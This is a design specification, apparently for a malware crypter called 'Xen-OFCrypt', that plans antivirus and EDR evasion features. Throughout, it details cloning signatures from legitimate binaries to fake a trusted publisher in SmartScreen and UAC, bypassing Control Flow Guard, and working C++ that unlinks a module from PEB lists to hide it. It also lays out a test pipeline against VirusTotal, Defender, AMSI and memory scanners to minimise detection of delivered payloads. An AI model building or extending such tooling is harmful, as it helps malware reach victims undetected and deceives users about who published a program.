# Tier 4: Polish — Detailed Specification

**Parent:** [Master Design](2026-05-25-xen-premium-master-design.md)
**Status:** Approved
**Priority:** NICE TO HAVE
**Milestone:** M5
**Dependencies:** Tier 1 + Tier 2 + Tier 3

---

## 16. Certificate Cloning

**Files to modify:** `CodeSigner.cs`
**StubConfig flag:** N/A (builder-only feature)
**ПРОБЛЕМА #6 — Техника устаревает, приоритет снижен до RESEARCH**

### ПРОБЛЕМА #6 — Современные EDR проверяют валидность подписи

Cloned signature approach (ScareCrow) вставляет WIN_CERTIFICATE из легитимного PE.
Результат: подпись ПРИСУТСТВУЕТ, но НЕВАЛИДНА (PE hash изменён после патчинга).

Раньше: многие AV/EDR проверяли только НАЛИЧИЕ подписи → техника работала.
Сейчас: Defender, CrowdStrike, Carbon Black проверяют валидность → техника детектируется.

Тем не менее, техника имеет ценность для:
- SmartScreen: показывает "Verified publisher" даже при невалидной подписи
  (некоторые версии SmartScreen проверяют только наличие, не валидность)
- Поверхностных сканеров: YARA rules, простые AV engines
- Безпризорных сред: где нет полноценного EDR

Вердикт: реализуем как RESEARCH ITEM, не как критическую фичу.
Если тесты показывают нулевую эффективность против Defender → удаляем.

### Architecture (unchanged from original spec)

### Clone Process

```
1. Source PE Selection
   Builder maintains database of legitimate PEs with valid signatures:
   - Windows system binaries (sigverif.exe, msiexec.exe, etc.)
   - Common third-party software (7zip, Notepad++, VSCode, etc.)
   - Enterprise software (Office components, etc.)

2. Signature Extraction
   From source PE:
   a. Parse IMAGE_DIRECTORY_ENTRY_SECURITY
   b. Extract WIN_CERTIFICATE structure
   c. Extract PKCS#7 SignedData blob
   d. Preserve: certificate chain, timestamp, signature algorithms

3. Signature Injection
   Into target PE (our stub):
   a. Append WIN_CERTIFICATE to end of PE file
   b. Set IMAGE_DIRECTORY_ENTRY_SECURITY to point to new signature
   c. Fix PE checksum (checksum_repair stage in PEMutator)

4. Result
   - SmartScreen sees "Verified publisher: Microsoft Corporation" (or other)
   - UAC dialog shows legitimate publisher
   - Authenticode verification: signature is invalid (tampered PE) but
     many AV/EDR don't verify signature integrity, only presence
   - Some products check only that signature EXISTS, not that it's VALID
```

### Implementation Notes

```
Critical detail: cloned signature is NOT valid for our modified PE.
The PE hash changes after patching (StubPatcher modifies .xthrx section).
This means:
- sigcheck /a will show "Signature is invalid"
- But many EDR/AV only check for signature PRESENCE
- SmartScreen may still show the original publisher name
- This is the same approach ScareCrow uses successfully

For best results:
  - Clone from PE with same approximate size as our stub
  - Clone from PE with similar section layout
  - Apply AFTER all PEMutator stages (so PE is in final form)
  - PEMutator must update checksum after signature injection
```

### Certificate Database

```
Builder ships with embedded database:
  - 50+ legitimate PEs with known-good signatures
  - Categorized by: publisher, size range, section count
  - Auto-select best match based on stub characteristics
  - User can also provide custom source PE
```

### Testing

- Signed stub passes SmartScreen without "Unknown Publisher" warning
- Cloned signature present in PE headers
- Authenticode presence check (many AVs) passes
- Signature hash is invalid (expected) but presence check succeeds

---

## 17. CFG Bypass

**Files to add:** `CfgBypass.h`, `CfgBypass.cpp`
**StubConfig flag:** `bCfgBypass`

### Architecture

Control Flow Guard (CFG) restricts indirect call targets to a validated set.
If our stub makes indirect calls to addresses not in the CFG bitmap, the process terminates.

### Bypass Techniques

```
Method 1: SetValidTargetsCfgForModule
  - NtDll!RtlSetValidTargetsCfgForModule
  - Adds our addresses to the valid call target set
  - Requires: module handle, address range
  - Problem: this API may be hooked by EDR

Method 2: __guard_dispatch_icall_fptr Manipulation
  - Locate PE's __guard_dispatch_icall_fptr
  - This points to ntdll!LdrpValidateUserCallTarget
  - Replace with our own validator that always returns valid
  - Our validator: push the actual target address, ret
  - Problem: modifying this pointer may be detected

Method 3: CFG Bitmap Manipulation
  - Locate the CFG bitmap in ntdll (LdrSystemDllInitBlock)
  - Set bits corresponding to our code addresses
  - LdrSystemDllInitBlock.CfgBitMap points to the bitmap
  - Set appropriate bits for our address range
  - Most reliable but requires finding the bitmap

Method 4: Disable CFG via Process Mitigation Policy
  - SetProcessMitigationPolicy(ProcessControlFlowGuardPolicy)
  - Can disable CFG for the current process
  - Problem: this API call may be monitored by EDR
```

### Implementation

```cpp
// CfgBypass.cpp
namespace CfgBypass {
    bool DisableForCurrentProcess() {
        // Method 3 preferred: bitmap manipulation
        // 1. Find LdrSystemDllInitBlock via PEB walk
        // 2. Locate CfgBitMap field
        // 3. Calculate bit offset for our module's address range
        // 4. Set bits in bitmap
        // 5. Verify: indirect call to our address succeeds
    }
}
```

### Testing

- Stub with CFG enabled can make indirect calls without CFG violation
- All execution methods (RunPE, ModuleStomp, etc.) work with CFG bypass
- No process termination due to __fastfail

---

## 18. DLL Notification Unlinking

**Files to add:** `DllUnlink.h`, `DllUnlink.cpp`
**StubConfig flag:** `bDllUnlink`

### Architecture

When a DLL is loaded, it's registered in the PEB's LDR_DATA_TABLE_ENTRY lists:
- InLoadOrderModuleList
- InMemoryOrderModuleList
- InInitializationOrderModuleList

EDR walks these lists to find loaded DLLs. Our Phantom DLL or stub DLL appearing in these lists is suspicious.

### Unlinking Process

```
1. Locate our module's LDR_DATA_TABLE_ENTRY via PEB
   PEB → Ldr → InMemoryOrderModuleList → walk until module base matches

2. Unlink from all three lists:
   entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
   entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
   // Same for InMemoryOrderModuleList and InInitializationOrderModuleList

3. Result:
   - EnumProcessModules / CreateToolhelp32Snapshot does not list our DLL
   - EDR module enumeration misses our code
   - Our code still runs normally (memory is still mapped)

4. Caveats:
   - Unlinking from InInitializationOrderModuleList may cause issues
     if the OS tries to send DLL_PROCESS_DETACH notifications
   - Some EDRs also scan memory directly (not just PEB lists)
   - Must be done AFTER all initialization is complete
```

### Implementation

```cpp
// DllUnlink.cpp
namespace DllUnlink {
    bool UnlinkFromPeb() {
        // 1. Get PEB via GS:[0x60] (x64)
        PPEB pPeb = (PPEB)__readgsqword(0x60);

        // 2. Walk InMemoryOrderModuleList
        PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        while (curr != head) {
            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

            // 3. Find our module by base address
            if (entry->DllBase == g_OurModuleBase) {
                // 4. Unlink from all three lists
                UnlinkEntry(&entry->InLoadOrderLinks);
                UnlinkEntry(&entry->InMemoryOrderLinks);
                UnlinkEntry(&entry->InInitializationOrderLinks);

                // 5. Zero the entry pointers (cleanup)
                entry->InLoadOrderLinks.Flink = NULL;
                entry->InLoadOrderLinks.Blink = NULL;
                entry->InMemoryOrderLinks.Flink = NULL;
                entry->InMemoryOrderLinks.Blink = NULL;
                entry->InInitializationOrderLinks.Flink = NULL;
                entry->InInitializationOrderLinks.Blink = NULL;

                return true;
            }

            curr = curr->Flink;
        }

        return false;
    }

    void UnlinkEntry(PLIST_ENTRY entry) {
        PLIST_ENTRY prev = entry->Blink;
        PLIST_ENTRY next = entry->Flink;
        prev->Flink = next;
        next->Blink = prev;
    }
}
```

### Integration

- Called AFTER all initialization is complete (after step 8 in boot sequence)
- Called BEFORE any payload execution
- Combined with Anti-MemScan (#6) for maximum coverage
- If Phantom DLL is used, unlink the hollowed DLL too

### Testing

- EnumProcessModules does not list our module after unlinking
- CreateToolhelp32Snapshot MODULE32 does not list our module
- Our code still functions correctly
- PE-sieve module scan does not find our module via PEB walk

---

## 19. Builder UX Improvements

**Files to modify:** WPF Views (6 XAML+CS pairs), `MainWindow.xaml`
**StubConfig flag:** N/A (builder-only)

### Improvements

```
1. Real-Time Build Preview
   - Show estimated detection rate before building
   - Preview of PE structure mutations
   - Show selected techniques and their EDR bypass effectiveness

2. Config Templates
   - Pre-built configurations for common scenarios:
     "Defender Bypass" — all Tier 1 + Defender profile
     "Maximum Stealth" — all techniques enabled
     "Quick Build" — minimal techniques, fast compile
     "Sideload CPL" — CPL format with appropriate settings
   - One-click template application

3. Build Log
   - Detailed log of each PEMutator stage
   - Log of StubPatcher operations
   - Log of CodeSigner operations
   - Exportable as text file

4. Payload Simulator
   - Test stub with benign payload (e.g., notepad.exe)
   - Verify all techniques work before using real payload
   - Simulate EDR detection environment
   - Show which techniques are active and their status

5. Validation Dashboard
   - Show StubConfig field mapping (human-readable)
   - Show sentinel marker offsets
   - Show estimated PE entropy per section
   - Show IAT import count (lower = better)
```

### UI Layout Changes

```
Main Window:
  Tab 1: Configuration (existing, enhanced)
    - Payload selection + format dropdown
    - Cipher engine selection
    - Execution method selection
    - Template dropdown + Apply button
  Tab 2: Evasion Techniques (new)
    - Checklist of all techniques (Tier 1-4)
    - Per-technique: enable/disable toggle + info tooltip
    - EDR profile selection
    - Estimated effectiveness rating
  Tab 3: Build (existing, enhanced)
    - Build button + progress bar
    - Build log (scrollable text box)
    - Output file info (size, entropy, detection estimate)
  Tab 4: Simulator (new)
    - Payload simulator controls
    - Technique status indicators
    - Detection test results
```

### Testing

- Template application correctly sets all StubConfig fields
- Build log shows all PEMutator stages
- Payload simulator runs with benign payload
- All new UI controls are responsive and functional

---

## 20. Private Sandbox Testing Pipeline

**Files to add:** `tests/` directory with test scripts
**StubConfig flag:** N/A (testing infrastructure)

### Architecture

Automated testing against common security tools to verify bypass effectiveness.

### Testing Pipeline

```
Stage 1: Static Analysis
  Tools:
    - VirusTotal API (upload, get detection ratio)
    - pe-sieve32/64 (local memory scan simulation)
    - pestudio (static PE analysis)
    - yara-cli with custom rule set
  Metrics:
    - VT detection ratio (target: ≤5/72 for Tier 1)
    - pe-sieve: no flagged memory regions
    - pestudio: no suspicious indicators
    - YARA: no rule matches

Stage 2: Dynamic Analysis (Sandboxed)
  Tools:
    - Windows Defender (real-time protection enabled)
    - AMSI scan simulation (AmsiScanBuffer call)
    - ETW trace analysis (Microsoft-Antimalware-Scan-Interface provider)
  Metrics:
    - AMSI: scan returns AMPI_RESULT_CLEAN
    - ETW: no events flagged
    - Defender: no detection/alert

Stage 3: Memory Scanning
  Tools:
    - pe-sieve (running process scan)
    - HollowsHunter (hollowed module detection)
    - Moneta (memory attribute analysis)
  Metrics:
    - pe-sieve: no suspicious regions
    - HollowsHunter: no hollowed modules found
    - Moneta: no anomalous memory attributes

Stage 4: Network Analysis (for staged delivery)
  Tools:
    - Wireshark/tshark (capture network traffic)
    - Fiddler (HTTPS proxy)
  Metrics:
    - No cleartext payload in network traffic
    - DoH queries appear as legitimate DNS
    - Domain fronting connections match CDN patterns
```

### Test Automation

```
PowerShell test runner:
  1. Build stub with test configuration (benign payload)
  2. Run Stage 1 (static analysis)
  3. If Stage 1 passes → run Stage 2 (dynamic)
  4. If Stage 2 passes → run Stage 3 (memory)
  5. If staged delivery enabled → run Stage 4 (network)
  6. Generate report: pass/fail per metric
  7. Archive: build config + results + timestamps

Trigger: manual (developer runs test suite) or CI-like (on git push)
```

### Test Payload

```
Standard test payload: benign .NET console app
  - Writes "Hello from Xen-OFCrypt" to console
  - No network activity
  - No file system writes
  - No registry access
  - Small enough for inline embedding
  - Can be used as .NET assembly loading test
```

### Regression Testing

```
On every Tier milestone:
  1. Run full pipeline against Tier N build
  2. Compare with Tier N-1 results
  3. If any metric regresses → investigate and fix
  4. Document: what changed, why, and fix applied
```

### Testing

- Test pipeline runs end-to-end on Windows 10/11
- All stages produce pass/fail results
- Report is generated and archived
- Regression detection works (compares with previous results)
